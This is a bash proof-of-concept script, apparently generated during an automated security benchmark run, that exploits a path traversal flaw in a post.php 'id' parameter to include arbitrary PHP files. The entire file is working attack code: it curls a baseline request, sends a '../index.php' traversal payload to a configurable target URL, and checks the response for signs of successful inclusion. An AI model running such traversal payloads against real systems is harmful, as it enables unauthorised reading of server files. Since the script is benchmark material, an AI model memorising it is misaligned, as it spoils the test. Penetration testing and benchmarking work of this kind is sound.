#!/bin/bash
# POC: Local File Inclusion (LFI) exploit via path traversal in post.php id parameter. Demonstrates arbitrary PHP file inclusion by using ../ sequences to escape the intended directory.
# Target: ./repo
# Created: 2025-11-07T16:54:05.555Z
# Session: benchmark-XBEN-061-24-mhp3932p

# Local File Inclusion (LFI) Proof of Concept
# Target: post.php?id parameter
# Vulnerability: Path traversal allows reading arbitrary PHP files

TARGET_URL="${1:-http://localhost:8080}"
TIMEOUT=10

echo "[*] Local File Inclusion (LFI) POC - post.php"
echo "[*] Target: ${TARGET_URL}"
echo ""

# Test 1: Normal request (baseline)
echo "[TEST 1] Normal request to post.php"
echo "Command: curl -s \"${TARGET_URL}/post.php?id=1\" --max-time ${TIMEOUT}"
NORMAL_RESPONSE=$(curl -s "${TARGET_URL}/post.php?id=1" --max-time ${TIMEOUT} 2>&1)
echo "Response snippet: ${NORMAL_RESPONSE:0:100}..."
echo ""

# Test 2: LFI attempt with ../index.php
echo "[TEST 2] LFI attempt - Accessing index.php via path traversal"
echo "Command: curl -s \"${TARGET_URL}/post.php?id=../index.php\" --max-time ${TIMEOUT}"
LFI_RESPONSE=$(curl -s "${TARGET_URL}/post.php?id=../index.php" --max-time ${TIMEOUT} 2>&1)

# Check for indicators of successful LFI
if echo "${LFI_RESPONSE}" | grep -qi "eternalblue"; then
    echo "[+] SUCCESS: Path traversal worked! Found 'EternalBlue' content in response"
    echo "[+] Application included index.php content when requested via ../index.php"
    echo ""
    echo "[EVIDENCE] Response contains blog posts from index.php:"
    echo "${LFI_RESPONSE}" | grep -i "eternalblue" | head -3
    echo ""
    exit 0
elif echo "${LFI_RESPONSE}" | grep -qi "post not found"; then
    echo "[-] FAILED: Got 'Post not found' - vulnerability may not be present or response changed"
    echo "Full response: ${LFI_RESPONSE:0:200}"
    echo ""
    exit 1
else
    # Check if we got different content than normal request
    if [ "${NORMAL_RESPONSE}" != "${LFI_RESPONSE}" ] && [ ${#LFI_RESPONSE} -gt 100 ]; then
        echo "[+] PARTIAL SUCCESS: Different content returned than normal request"
        echo "[+] Response length - Normal: ${#NORMAL_RESPONSE}, LFI: ${#LFI_RESPONSE}"
        echo "[+] This suggests file inclusion is occurring"
        echo ""
        echo "LFI Response snippet:"
        echo "${LFI_RESPONSE:0:300}..."
        echo ""
        exit 0
    else
        echo "[-] FAILED: Could not confirm LFI exploitation"
        echo "Response: ${LFI_RESPONSE:0:200}"
        echo ""
        exit 1
    fi
fi